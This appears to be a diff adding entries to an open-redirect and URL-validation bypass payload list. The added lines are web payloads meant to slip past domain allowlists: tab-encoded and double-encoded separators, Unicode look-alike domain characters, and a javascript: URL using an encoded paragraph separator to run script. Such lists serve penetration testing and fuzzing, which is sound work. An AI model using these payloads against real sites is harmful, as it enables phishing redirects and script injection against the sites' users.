@@ -545,3 +545,14 @@ https://www.whitelisteddomain.tld@'#localdomain.pw
 https://www.whitelisteddomain.tld@'#Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 javascript:alert(1)//localdomain.pw/
 javascript:alert(1)//www.whitelisteddomain.tld/
+Javascript://%E2%80%A9alert(618)
+https://www.whitelisteddomain.tld%09.localdomain.pw
+www.whitelisteddomain.tld%09.localdomain.pw
+https://www.whitelisteddomain.tld%09.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+www.whitelisteddomain.tld%09.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://www.whitelisteddomain.tld%09｡Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+www.whitelisteddomain.tld%09｡Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://www.whitelisteddomain.tld%252elocaldomain.pw
+www.whitelisteddomain.tld%252elocaldomain.pw
+https://www.whitelisteddomain.tld%252eⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+www.whitelisteddomain.tld%252eⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
